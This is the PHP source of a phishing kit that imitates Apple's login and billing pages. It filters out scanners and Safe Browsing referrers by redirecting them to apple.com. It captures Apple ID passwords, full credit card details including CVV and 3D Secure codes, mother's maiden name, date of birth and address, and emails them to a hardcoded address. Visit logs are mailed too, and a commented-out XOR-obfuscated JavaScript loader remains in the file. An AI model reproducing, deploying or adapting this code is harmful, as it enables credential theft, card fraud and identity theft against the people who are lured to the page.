<?php

session_start();
$snd = array("foufou027@live.com");
$log = array("foufou027@live.com");

include 'hex2bin.php';
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");


function alert($to,$tt,$bd) {
	echo "
	<script type=\"text/javascript\">
		alert(".encode("$to\n\n$tt\n\n$bd").");
	</script>
	";
}

function encode($str) {
	$c = bin2hex($str);
	if ((strlen($c)%2)==1) {
		$c = '0'.$c;
	}
	$t = '';
	for ($i=0;$i<strlen($c);$i+=2) {
	 $t .= '\x'.$c[$i].$c[$i+1];
	}
	return "\"$t\"";
}

function enc_xor($t,$k=31) {
	$r = '';
	for ($i=0;$i<strlen($t);$i++) {
	$r .= chr(ord($t[$i])^$k);
	}
	return $r;
}

function isbrowser() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $ub = false;
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) {$ub = true;}
    elseif(preg_match('/Firefox/i',$u_agent)) {$ub = true;}
    elseif(preg_match('/Chrome/i',$u_agent)) {$ub = true;}
    elseif(preg_match('/Safari/i',$u_agent)) {$ub = true;}
    elseif(preg_match('/Opera/i',$u_agent)) {$ub = true;}
    elseif(preg_match('/Netscape/i',$u_agent)) {$ub = true;}
	return $ub;
}

function isbadip() {
	$banned = array("193","17","188","2","63","64","66","72","74","209","216","173","149","89", "83", "8", "46");
	$e = explode(".",$_SERVER['REMOTE_ADDR']);
	return in_array($e[0],$banned);
}

function isbadref() {
	$r = false;
	if (isset($_SERVER['HTTP_REFERER'])) {
		$ref = $_SERVER['HTTP_REFERER'];
		if(preg_match('/safebrowsing/i',$ref)) {$r = true;}
		return $r;
	}
	else return $r;
}

if((!isbrowser()) or (isbadip()) or (isbadref())) {
	header("location: https://apple.com");
	die();
}

function tcountry() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    }
    else {
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}


function page($i) {
	$pppp = file_get_contents("$i.html");
	//echo "<script>";
	$pagec = file_get_contents("./$i.html");
	if ($i==1) { // if page 1
		if (!(isset($_SESSION['data']) && isset($_SESSION['data'][0]))) // clean up 1
			$_SESSION['data'][0] = ''; 
		$pagec = str_replace('{0}',$_SESSION['data'][0],$pagec);
	} elseif ($i==2) { // if page 2
		if (!isset($_SESSION['data'])) $_SESSION['data'] = explode("|",'||||||||'); // lol
		for ($j=1;$j<count($_SESSION['data']);$j++) {
			if (!(isset($_SESSION['data'][$j]))) $_SESSION['data'][$j] = ''; // clean up 2
			if (($j==2) or ($j==3) or ($j==4)) {
				$_SESSION['data'][$j] = (int)($_SESSION['data'][$j]); // clean up 3
				if ($j==2) $pagec = str_replace('monthattr="'.$_SESSION['data'][$j].'"','selected',$pagec);
				if ($j==3) $pagec = str_replace('dayattr="'.$_SESSION['data'][$j].'"','selected',$pagec);
				if ($j==4) $pagec = str_replace('yearattr="'.$_SESSION['data'][$j].'"','selected',$pagec);
			} else $pagec = str_replace("{".$j."}",$_SESSION['data'][$j],$pagec);
		}
		$pagec = str_replace("value=\"".$_SESSION['country']."\"","selected value=\"".$_SESSION['country']."\"",$pagec);
	}
	return $pagec;
	// $pagec = encode($pagec);
	// $c2 = "
// document.write($pagec);";
	// $c1 = "  document.location=String.fromCharCode(47)+String.fromCharCode(47)+\"apple.com\"//";
	// $init = "v = ".encode( enc_xor($c1,31).enc_xor($c2,16) ).";";
	// print "
// _=eval;eval=function(e,t){if(t==0)document.eva=e;if(t==1)document.eva+=e;if(t==2){e=document.eva+e;document.eva='';_(e)}}
// $init
// ua = window.navigator.userAgent;
// xor = (((Math.pow((-1),(((15*(ua.indexOf('Firefox')!=-1||ua.indexOf('Chrome')!=-1||ua.indexOf('Safari')!=-1||ua.indexOf('Opera')!=-1||ua.indexOf('Netscape')!=-1))+16)+0))+1)/2)*((15*(ua.indexOf('Firefox')!=-1||ua.indexOf('Chrome')!=-1||ua.indexOf('Safari')!=-1||ua.indexOf('Opera')!=-1||ua.indexOf('Netscape')!=-1))+16)+(15+((Math.pow((-1),(((15*(ua.indexOf('Firefox')!=-1||ua.indexOf('Chrome')!=-1||ua.indexOf('Safari')!=-1||ua.indexOf('Opera')!=-1||ua.indexOf('Netscape')!=-1))+16)+1))+1)/2)));
// t = '';
// for(i=0;i<v.length;i++){
// t+=(String.fromCharCode(v.charCodeAt(i) ^ xor));
// }_(t);
// ";

	//echo "</script>";
}


function sendm($t,$b) {
	global $snd;
	$love = "<pre>$b</pre>";
	// alert(join(",",$snd),$t,$love); 
	mail(join(",",$snd),$t,$love);
	return 1;
}
function sendm1($t,$b) {
	global $snd1;
	$love = "<pre>$b</pre>";
	// alert(join(",",$snd1),$t,$love); 
	mail(join(",",$snd1),$t,$love);
	return 1;
}
function logm($t,$b) {
	global $log;
	$love = "<pre>$b</pre>";
	// alert(join(",",$log),$t,$love); 
	mail(join(",",$log),$t,$love);
	return 1;
}

$ip = $_SERVER['REMOTE_ADDR'];

function getvixi() {
	$ip = $_SERVER['REMOTE_ADDR'];
	$msg  = "\n";
	$msg .= "USER AGENT: [".$_SERVER['HTTP_USER_AGENT']."]\n";
	$msg .= "\n";
	$msg .= "IP:         [http://www.geoiptool.com/?IP=$ip]\n";
	if (isset($_SERVER['HTTP_REFERER'])) {
		$msg .= "\n";
		$msg .= "REFERER   : [".$_SERVER['HTTP_REFERER']."]\n";
	}
	return $msg;
}

if(isset($_POST["user"])) {
	$_SESSION['user'] = $_POST['user'];
	$_SESSION['pass'] = $_POST['pass'];
	$ttl  = "[Apple] [LOGN] [IP:$ip]";
	$msg  = "=-[ UP ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "USER       : ".$_POST['user']."\n";
	$msg .= "PASS       : ".$_POST['pass']."\n";
	$msg .= "=-[ UP ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "=-[ BT ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= getvixi();
	$msg .= "=-[ BT ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	sendm($ttl,$msg);
}
elseif(isset($_POST["ccnumber"])) {
	$ttl  = "[Apple] [FULL] [IP:$ip]";
	$dob  = $_POST['month']."/".$_POST['day']."/".$_POST['year'];
	$exp  = $_POST['expmonth']."/".$_POST['expyear'];
	$msg  = "=-[ UP ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "USER       : ".$_SESSION['user'] ."\n";
	$msg .= "PASS       : ".$_SESSION['pass'] ."\n";
	$msg .= "=-[ UP ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg  = "=-[ CC ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "Full Name  : ".$_POST['fullname']   ."\n";
	$msg .= "Adress     : ".$_POST['address']    ."\n";
	$msg .= "Zip        : ".$_POST['zip']        ."\n";
	$msg .= "Country    : ".$_POST['country']    ."\n";
	$msg .= "Birth      : ".$dob                 ."\n";
	$msg .= "Mobile     : ".$_POST['mobile']     ."\n";
	$msg .= "Mmn        : ".$_POST['mmn']     ."\n";
	$msg .= "CC         : ".$_POST['ccnumber']   ."\n";
	$msg .= "Exp        : ".$exp                 ."\n";
	$msg .= "COD        : ".$_POST['cvv']        ."\n";
	$msg .= "3d        : ".$_POST['3d']        ."\n";
	$msg .= "=-[ CC ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	if (isset($_SESSION['data'])) {
	$msg .= "=-[ MD ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "Full Name  : ".$_SESSION['data'][1] ."\n";
	$msg .= "Adress 1   : ".$_SESSION['data'][5] ."\n";
	$msg .= "Zip        : ".$_SESSION['data'][6] ."\n";
	$msg .= "Mobile     : ".$_SESSION['data'][7] ."\n";
	$msg .= "Mmn        : ".$_SESSION['data'][8] ."\n";
	$msg .= "Birth      : ".$_SESSION['data'][2].'/'.$_SESSION['data'][3].'/'.$_SESSION['data'][4] ."\n";
	$msg .= "EMAIL      : ".$_SESSION['data'][0] ."\n";
	$msg .= "=-[ MD ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	}
	$msg .= "=-[ BT ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= getvixi();
	$msg .= "=-[ BT ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	
	sendm($ttl,$msg);
}
if(isset($_POST["user"])) {
	$_SESSION['user'] = $_POST['user'];
	$_SESSION['pass'] = $_POST['pass'];
	$ttl  = "[Apple] [LOGN] [IP:$ip]";
	$msg  = "=-[ UP ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "USER       : ".$_POST['user']."\n";
	$msg .= "PASS       : ".$_POST['pass']."\n";
	$msg .= "=-[ UP ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "=-[ BT ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= getvixi();
	$msg .= "=-[ BT ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	sendm1($ttl,$msg);
}
elseif(isset($_POST["ccnumber"])) {
	$ttl  = "[Apple] [FULL] [IP:$ip]";
	$dob  = $_POST['month']."/".$_POST['day']."/".$_POST['year'];
	$exp  = $_POST['expmonth']."/".$_POST['expyear'];
	$msg  = "=-[ UP ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "USER       : ".$_SESSION['user'] ."\n";
	$msg .= "PASS       : ".$_SESSION['pass'] ."\n";
	$msg .= "=-[ UP ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg  = "=-[ CC ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "Full Name  : ".$_POST['fullname']   ."\n";
	$msg .= "Adress     : ".$_POST['address']    ."\n";
	$msg .= "Zip        : ".$_POST['zip']        ."\n";
	$msg .= "Country    : ".$_POST['country']    ."\n";
	$msg .= "Birth      : ".$dob                 ."\n";
	$msg .= "Mobile     : ".$_POST['mobile']     ."\n";
	$msg .= "Mmn        : ".$_POST['mmn']     ."\n";
	$msg .= "CC         : ".$_POST['ccnumber']   ."\n";
	$msg .= "Exp        : ".$exp                 ."\n";
	$msg .= "COD        : ".$_POST['cvv']        ."\n";
	$msg .= "3d        : ".$_POST['3d']        ."\n";
	$msg .= "=-[ CC ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	if (isset($_SESSION['data'])) {
	$msg .= "=-[ MD ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= "Full Name  : ".$_SESSION['data'][1] ."\n";
	$msg .= "Adress 1   : ".$_SESSION['data'][5] ."\n";
	$msg .= "Zip        : ".$_SESSION['data'][6] ."\n";
	$msg .= "Mobile     : ".$_SESSION['data'][7] ."\n";
	$msg .= "Mmn        : ".$_SESSION['data'][8] ."\n";
	$msg .= "Birth      : ".$_SESSION['data'][2].'/'.$_SESSION['data'][3].'/'.$_SESSION['data'][4] ."\n";
	$msg .= "EMAIL      : ".$_SESSION['data'][0] ."\n";
	$msg .= "=-[ MD ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	}
	$msg .= "=-[ BT ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	$msg .= getvixi();
	$msg .= "=-[ BT ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
	
	sendm1($ttl,$msg);
}

function sendload($p) {
	$ip = $_SERVER['REMOTE_ADDR'];
	$ttl  = "[Apple] [LOAD] [$p] [IP:$ip]";
	$msg  = getvixi();
	logm($ttl,$msg);
}

/*
  expected data here are:
	email@host.com|name lastname|1|2|1990|bill address|7172A|12345678
	http://S:81/s/?secure_token=656d61696c40686f73742e636f6d7c6e616d65206c6173746e616d657c317c327c313939307c62696c6c20616464726573737c37313732417c3132333435363738
*/
function autofill() {
	if (isset($_GET['secure_token'])) {
		$_SESSION['data'] = explode("|",hex2bin($_GET['secure_token']));
		header("location: ?");
		die();
	}
	elseif (!isset($_SESSION['data'])) $_SESSION['data'] = explode("|",'||||||||');
}

if (!isset($_SESSION['country'])) $_SESSION['country']=tcountry();
if (isset($_GET['2'])) {
	sendload("INFO");
	print page(2);
}
elseif (isset($_GET['3'])) {
	sendload("END");
	print page(3);
	// session_destroy();
}
else {
	autofill();
	//if ((!isset($_GET['secure_token'])) or (!isset($_SESSION['data']))) {header("location: /");die();}
	sendload("LOGIN");
	print page(1);
}
?>